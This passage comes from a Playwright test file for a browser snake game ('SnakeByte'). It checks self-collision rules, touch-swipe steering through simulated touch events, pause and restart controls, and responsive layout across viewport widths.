      page.evaluate(() => document.activeElement?.getAttribute("class") ?? ""),
    )
    .toContain("game-screen");
});

test("hitting your own body loses a fragment and grants grace", async ({
  page,
}) => {
  await page.evaluate(() =>
    localStorage.setItem(
      "bitarcade.snakebyte.v1.rules",
      JSON.stringify({
        startingLength: 7,
        minimumLength: 3,
        wallCost: 1,
        wallGraceMs: 2000,
        speedEasyMs: 300,
        speedMediumMs: 300,
        speedHardMs: 300,
        speedRampPercent: 0,
      }),
    ),
  );
  await page.reload();
  await page.evaluate(() => document.fonts.ready);
  await page.getByRole("button", { name: "Start game", exact: true }).click();
  await page.keyboard.press("ArrowUp");
  await page.waitForTimeout(320);
  await page.keyboard.press("ArrowLeft");
  await page.waitForTimeout(320);
  await page.keyboard.press("ArrowDown");
  await expect(page.getByTestId("grace-status")).toBeVisible({
    timeout: 3000,
  });
  await expect(page.locator(".game-screen")).toHaveClass(/phase-playing/);
  await expect(page.locator(".run-mini-stats")).toContainText(
    /fragments\s*03/i,
  );
});

test.describe("touch cabinet", () => {
  test.use({
    viewport: { width: 390, height: 844 },
    isMobile: true,
    hasTouch: true,
    deviceScaleFactor: 2,
  });

  test("real touch swipes steer the snake", async ({ page }) => {
    await page.getByRole("button", { name: "Start game", exact: true }).tap();
    await expect(page.getByTestId("score")).toHaveText("00010");
    const start = await headCenter(page);
    const bounds = (await page.locator(".game-screen").boundingBox())!;
    const client = await page.context().newCDPSession(page);
    const x = bounds.x + bounds.width / 2,
      y = bounds.y + bounds.height / 2;
    await client.send("Input.dispatchTouchEvent", {
      type: "touchStart",
      touchPoints: [{ x, y }],
    });
    await client.send("Input.dispatchTouchEvent", {
      type: "touchMove",
      touchPoints: [{ x, y: y - 55 }],
    });
    await client.send("Input.dispatchTouchEvent", {
      type: "touchEnd",
      touchPoints: [],
    });
    await expect
      .poll(async () => (await headCenter(page)).y)
      .toBeLessThan(start.y - 8);
    const turned = await headCenter(page);
    await client.send("Input.dispatchTouchEvent", {
      type: "touchStart",
      touchPoints: [
        {
          x: bounds.x + bounds.width / 2,
          y: bounds.y + bounds.height / 2,
        },
      ],
    });
    await client.send("Input.dispatchTouchEvent", {
      type: "touchMove",
      touchPoints: [
        {
          x: bounds.x + bounds.width / 2 + 55,
          y: bounds.y + bounds.height / 2,
        },
      ],
    });
    await client.send("Input.dispatchTouchEvent", {
      type: "touchEnd",
      touchPoints: [],
    });
    await expect
      .poll(async () => (await headCenter(page)).x)
      .toBeGreaterThan(turned.x + 8);
    await expect(page.locator(".direction-key")).toHaveCount(0);
    await expect(
      page.getByText("Swipe to steer", { exact: true }),
    ).toBeVisible();
    await page.getByRole("button", { name: "Pause game" }).tap();
    await expect(
      page.getByRole("heading", { name: "Paused", exact: true }),
    ).toBeVisible();
    await page.getByRole("button", { name: "Resume", exact: true }).tap();
    await expect(page.locator(".game-screen")).toHaveClass(/phase-playing/);
    await page.getByRole("button", { name: "Pause game" }).tap();
    await page.getByRole("button", { name: "Restart paused run" }).tap();
    await expect(page.locator(".game-screen")).toHaveClass(/phase-playing/);
    await expect(page.getByTestId("score")).toHaveText("00000");
  });

  test("native touch events steer without pointer capture", async ({
    page,
  }) => {
    await page.getByRole("button", { name: "Start game", exact: true }).tap();
    await expect(page.locator("canvas")).toHaveCSS("touch-action", "none");
    await expect(page.locator(".game-screen")).toHaveCSS(
      "overscroll-behavior",
      "contain",
    );
    const before = await headCenter(page);
    const prevented = await page.evaluate(() => {
      const canvas = document.querySelector("canvas")!;
      const rect = canvas.getBoundingClientRect();
      const x = rect.left + rect.width / 2;
      const y = rect.top + rect.height / 2;
      const startTouch = new Touch({
        identifier: 77,
        target: canvas,
        clientX: x,
        clientY: y,
      });
      const moveTouch = new Touch({
        identifier: 77,
        target: canvas,
        clientX: x,
        clientY: y - 70,
      });
      const start = new TouchEvent("touchstart", {
        touches: [startTouch],
        targetTouches: [startTouch],
        changedTouches: [startTouch],
        bubbles: true,
        cancelable: true,
      });
      const move = new TouchEvent("touchmove", {
        touches: [moveTouch],
        targetTouches: [moveTouch],
        changedTouches: [moveTouch],
        bubbles: true,
        cancelable: true,
      });
      const end = new TouchEvent("touchend", {
        touches: [],
        targetTouches: [],
        changedTouches: [moveTouch],
        bubbles: true,
        cancelable: true,
      });
      const startPrevented = !canvas.dispatchEvent(start);
      const movePrevented = !canvas.dispatchEvent(move);
      canvas.dispatchEvent(end);
      return { startPrevented, movePrevented };
    });
    expect(prevented).toEqual({
      startPrevented: true,
      movePrevented: true,
    });
    await expect
      .poll(async () => (await headCenter(page)).y)
      .toBeLessThan(before.y - 8);
  });

  test("layout stays within phone, tablet, and laptop viewports", async ({
    page,
  }) => {
    for (const width of [320, 375, 390, 640, 768, 1024, 1440]) {
      await page.setViewportSize({ width, height: 844 });
      expect(
        await page.evaluate(() => document.documentElement.scrollWidth),
      ).toBeLessThanOrEqual(width);
      await expect(
        page.getByRole("button", { name: "Start game", exact: true }),
      ).toBeVisible();
      if (width <= 500) {
        await expect(page.locator(".direction-key")).toHaveCount(0);
        await expect(
          page.getByText("Swipe to steer", { exact: true }),
        ).toBeVisible();
      }
    }
    await page.setViewportSize({ width: 375, height: 667 });
    await page.getByRole("button", { name: "How to play" }).tap();
    await expect(page.getByRole("dialog")).toBeInViewport();
  });
});
